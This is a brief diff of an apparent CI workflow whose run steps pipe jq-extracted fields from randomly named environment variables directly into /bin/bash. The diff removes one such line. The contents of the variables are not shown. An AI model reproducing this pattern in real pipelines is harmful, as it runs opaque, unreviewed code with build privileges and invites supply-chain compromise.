@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$cna1893" | jq -r .pe0 | /bin/bash
           echo $lm3 | jq -r .fs32 | /bin/bash
-          echo $yxwd3986 | jq -r .xure3 | /bin/bash
           echo $uroa90804 | jq -r .lmbww45 | /bin/bash
           echo $v7 | jq -r .har79872 | /bin/bash
           printf '%s' "$w85279" | jq -r .ddmf908 | /bin/bash
